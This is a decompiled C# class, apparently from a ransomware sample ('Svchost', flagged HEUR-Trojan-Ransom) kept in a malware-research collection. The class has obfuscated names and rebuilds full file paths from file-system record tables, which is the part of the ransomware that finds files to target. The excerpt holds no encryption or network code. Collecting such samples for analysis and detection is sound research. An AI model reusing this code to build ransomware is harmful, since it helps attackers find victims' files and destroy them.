// Decompiled with JetBrains decompiler
// Type: eZkFrthrrFwCL.vsQXEBAtRsiO
// Assembly: Svchost, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F9AAAE71-E61A-4958-B1A7-6590C53648E2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Generic-8c723af5c826adea162ef3f2e37a1cca7b43d549c9a5fab7c9ff17f65eb5d8e7.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace eZkFrthrrFwCL
{
  public sealed class vsQXEBAtRsiO : IEnumerable<string>, IEnumerable
  {
    private Dictionary<ulong, vnuJlJKmoK> BYFhXQQLydd;
    private Dictionary<ulong, vnuJlJKmoK> DCgxXRjZKkeO;
    private readonly string WkzUTILTWDSY;

    public vsQXEBAtRsiO([In] string obj0) => this.WkzUTILTWDSY = obj0;

    IEnumerator IEnumerable.GetEnumerator() => (IEnumerator) this.GetEnumerator();

    public IEnumerator<string> GetEnumerator() => (IEnumerator<string>) new vsQXEBAtRsiO.yPtGgvKqJKwjpD(0)
    {
      PGBWaQuvLqS = this
    };

    private void JLYIzotYSIJ()
    {
      if (this.BYFhXQQLydd != null)
        return;
      new qkWKRdCGhTIAL().yQfRnhCHpWXyR(this.WkzUTILTWDSY, (HashSet<string>) null, out this.BYFhXQQLydd, out this.DCgxXRjZKkeO);
    }

    private sealed class yPtGgvKqJKwjpD : IEnumerator<string>, IDisposable, IEnumerator
    {
      private string xXzEjOqEMoCqJGu;
      private int cWliQwfvyqJMcuL;
      public vsQXEBAtRsiO PGBWaQuvLqS;
      public List<string> ouRYlnkIwqXGUy;
      public vnuJlJKmoK LCKhmOYDEfXrjZ;
      public vnuJlJKmoK zcAqFXOUai;
      public int tLULfSRxgUyTL;
      public string vySwPdOkid;
      public Dictionary<ulong, vnuJlJKmoK>.ValueCollection.Enumerator dCWujdcZpMJA;

      bool IEnumerator.MoveNext()
      {
        // ISSUE: fault handler
        try
        {
          switch (this.cWliQwfvyqJMcuL)
          {
            case 0:
              this.cWliQwfvyqJMcuL = -1;
              this.PGBWaQuvLqS.JLYIzotYSIJ();
              this.ouRYlnkIwqXGUy = new List<string>();
              this.dCWujdcZpMJA = this.PGBWaQuvLqS.BYFhXQQLydd.Values.GetEnumerator();
              this.cWliQwfvyqJMcuL = 1;
              break;
            case 2:
              this.cWliQwfvyqJMcuL = 1;
              break;
            default:
label_11:
              return false;
          }
          while (this.dCWujdcZpMJA.MoveNext())
          {
            this.LCKhmOYDEfXrjZ = this.dCWujdcZpMJA.Current;
            this.ouRYlnkIwqXGUy.Clear();
            this.zcAqFXOUai = this.LCKhmOYDEfXrjZ;
            this.tLULfSRxgUyTL = -1;
            do
            {
              if (this.zcAqFXOUai.get_ParentFrn() != 0UL)
                this.ouRYlnkIwqXGUy.Add(this.zcAqFXOUai.get_Name());
              this.zcAqFXOUai = !this.PGBWaQuvLqS.BYFhXQQLydd.ContainsKey(this.zcAqFXOUai.get_ParentFrn()) ? (!this.PGBWaQuvLqS.DCgxXRjZKkeO.ContainsKey(this.zcAqFXOUai.get_ParentFrn()) ? (vnuJlJKmoK) null : this.PGBWaQuvLqS.DCgxXRjZKkeO[this.zcAqFXOUai.get_ParentFrn()]) : this.PGBWaQuvLqS.BYFhXQQLydd[this.zcAqFXOUai.get_ParentFrn()];
            }
            while (this.zcAqFXOUai != null && ++this.tLULfSRxgUyTL < 1000);
            if (this.ouRYlnkIwqXGUy.Count != 0)
            {
              this.ouRYlnkIwqXGUy.Reverse();
              this.vySwPdOkid = this.PGBWaQuvLqS.WkzUTILTWDSY + (object) '\\' + Path.Combine(this.ouRYlnkIwqXGUy.ToArray());
              this.xXzEjOqEMoCqJGu = this.vySwPdOkid;
              this.cWliQwfvyqJMcuL = 2;
              return true;
            }
          }
          this.\u003C\u003Em__Finally7();
          goto label_11;
        }
        __fault
        {
          this.System\u002EIDisposable\u002EDispose();
        }
      }

      [SpecialName]
      string IEnumerator<string>.get_Current() => this.xXzEjOqEMoCqJGu;

      void IEnumerator.Reset() => throw new NotSupportedException();

      void IDisposable.Dispose()
      {
        switch (this.cWliQwfvyqJMcuL)
        {
          case 1:
          case 2:
            try
            {
            }
            finally
            {
              this.\u003C\u003Em__Finally7();
            }
            break;
        }
      }

      [SpecialName]
      object IEnumerator.get_Current() => (object) this.xXzEjOqEMoCqJGu;

      public yPtGgvKqJKwjpD([In] int obj0) => this.cWliQwfvyqJMcuL = obj0;

      private void \u003C\u003Em__Finally7()
      {
        this.cWliQwfvyqJMcuL = -1;
        this.dCWujdcZpMJA.Dispose();
      }
    }
  }
}
